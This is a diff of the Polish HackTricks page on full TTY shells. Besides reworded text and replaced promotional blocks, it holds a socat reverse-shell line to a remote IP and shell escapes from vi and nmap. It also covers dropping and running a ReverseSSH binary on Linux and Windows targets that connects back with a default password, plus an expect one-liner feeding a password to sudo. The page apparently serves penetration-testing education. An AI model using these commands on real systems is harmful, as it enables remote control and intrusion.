@@ -1,22 +1,23 @@
 # Pełne TTY
 
+{% hint style="success" %}
+Dowiedz się i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Dowiedz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Wesprzyj HackTricks</summary>
 
-Inne sposoby wsparcia HackTricks:
-
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Udostępnij sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
+{% endhint %}
 
 ## Pełne TTY
 
-Zauważ, że powłoka, którą ustawiasz w zmiennej `SHELL`, **musi** być **wymieniona wewnątrz** _**/etc/shells**_ lub `Nie znaleziono wartości dla zmiennej SHELL w pliku /etc/shells. Ten incydent został zgłoszony`. Ponadto, zauważ, że następne fragmenty działają tylko w bashu. Jeśli jesteś w zsh, przełącz się na bash, wykonując polecenie `bash`.
+Zauważ, że powłoka ustawiona w zmiennej `SHELL` **musi** być **wymieniona wewnątrz** _**/etc/shells**_ lub `Wartość zmiennej SHELL nie została znaleziona w pliku /etc/shells Ten incydent został zgłoszony`. Ponadto zauważ, że następne fragmenty działają tylko w bashu. Jeśli korzystasz z zsh, przełącz się na bash przed uzyskaniem powłoki, uruchamiając `bash`.
 
 #### Python
 
@@ -64,13 +65,13 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 * vi: `:set shell=/bin/bash:shell`
 * nmap: `!sh`
 
-## ReverseSSH
+## Odwrócony SSH
 
-Wygodnym sposobem na **interaktywny dostęp do powłoki**, a także na **przesyłanie plików** i **przekierowywanie portów**, jest umieszczenie na celu statycznie połączonego serwera ssh [ReverseSSH](https://github.com/Fahrj/reverse-ssh).
+Wygodnym sposobem uzyskania **interaktywnego dostępu do powłoki**, a także **transferu plików** i **przekierowywania portów**, jest umieszczenie statycznie połączonego serwera ssh [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na celu.
 
-Poniżej znajduje się przykład dla `x86` z binarnymi plikami skompresowanymi za pomocą upx. Dla innych plików binarnych sprawdź [stronę wydań](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Poniżej znajduje się przykład dla `x86` z binariami skompresowanymi za pomocą upx. Dla innych binariów sprawdź [stronę wydań](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
-1. Przygotuj lokalnie, aby przechwycić żądanie przekierowania portu ssh:
+1. Przygotuj lokalnie do przechwycenia żądania przekierowania portu ssh:
 
 {% code overflow="wrap" %}
 ```bash
@@ -81,9 +82,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2a) Cel Linux:
-
-{% code overflow="wrap" %}
+* (2a) Cel docelowy Linux:
 ```bash
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
@@ -92,7 +91,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2b) Cel: Windows 10 (dla wcześniejszych wersji, sprawdź [opis projektu](https://github.com/Fahrj/reverse-ssh#features)):
+* (2b) Cel docelowy Windows 10 (dla wcześniejszych wersji, sprawdź [README projektu](https://github.com/Fahrj/reverse-ssh#features)):
 
 {% code overflow="wrap" %}
 ```bash
@@ -101,9 +100,7 @@ certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/d
 
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
-{% endcode %}
-
-* Jeśli żądanie przekierowania portu ReverseSSH było udane, teraz powinieneś móc zalogować się za pomocą domyślnego hasła `letmeinbrudipls` w kontekście użytkownika uruchamiającego `reverse-ssh(.exe)`:
+* Jeśli żądanie przekierowania portu ReverseSSH było udane, powinieneś teraz móc zalogować się za pomocą domyślnego hasła `letmeinbrudipls` w kontekście użytkownika uruchamiającego `reverse-ssh(.exe)`:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -113,20 +110,21 @@ sftp -P 8888 127.0.0.1
 ```
 ## Brak TTY
 
-Jeśli z jakiegoś powodu nie możesz uzyskać pełnego TTY, nadal możesz **interakcjonować z programami**, które oczekują na dane od użytkownika. W poniższym przykładzie hasło jest przekazywane do `sudo`, aby odczytać plik:
+Jeśli z jakiegoś powodu nie możesz uzyskać pełnego TTY, nadal możesz **współdziałać z programami**, które oczekują danych wejściowych od użytkownika. W poniższym przykładzie hasło jest przekazywane do `sudo`, aby odczytać plik:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
+{% hint style="success" %}
+Ucz się i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Ucz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Wesprzyj HackTricks</summary>
 
-Inne sposoby wsparcia HackTricks:
-
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
+{% endhint %}
